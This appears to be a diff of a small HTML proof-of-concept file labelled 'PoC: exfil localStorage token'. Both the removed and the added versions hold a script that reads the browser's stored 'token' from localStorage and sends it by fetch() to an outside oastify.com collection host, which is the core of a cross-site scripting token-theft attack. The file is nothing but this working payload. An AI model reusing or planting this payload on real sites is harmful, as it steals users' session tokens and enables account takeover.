@@ -1,3 +1,9 @@
-<script>
-  fetch('https://z554rpb2vcoaz7pdqr16chkyrpxgl8fw4.oastify.com/?t=' + localStorage.getItem('token'));
-</script>
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      // PoC: exfil localStorage token
+      fetch('https://vml08lsyc856g3697ni2td1u8lec24xsm.oastify.com/?token=' + localStorage.getItem('token'));
+    </script>
+  </body>
+</html>
